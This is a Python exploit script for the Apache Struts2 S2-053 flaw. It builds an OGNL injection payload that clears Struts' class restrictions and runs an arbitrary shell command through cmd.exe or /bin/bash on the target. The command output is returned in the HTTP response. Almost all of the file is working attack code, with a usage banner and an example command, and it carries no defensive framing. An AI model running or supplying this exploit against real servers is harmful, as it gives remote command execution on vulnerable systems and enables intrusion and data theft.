import requests
import sys



def exploit(url):
    res = requests.get(url, timeout=10)
    if res.status_code == 200:
        print("[+] Response: {}".format(str(res.text)))
        print("\n[+] Exploit Finished!")
    else:
        print("\n[!] Exploit Failed!")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("""****S2-053 Exploit****
Usage:
    exploit.py <url> <param> <command>

Example:
    exploit.py "http://127.0.0.1/" "name" "uname -a"
        """)
        exit()
    url = sys.argv[1]
    param = sys.argv[2]
    command = sys.argv[3]
    # payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"""
    # Can show the echo message
    payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
    # link = "{}/?{}={}".format(url, param, quote(payload))
    link = "{}/?{}={}".format(url, param, requests.utils.quote(payload))
    print("[*] Generated EXP: {}".format(link))
    print("\n[*] Exploiting...")
    exploit(link)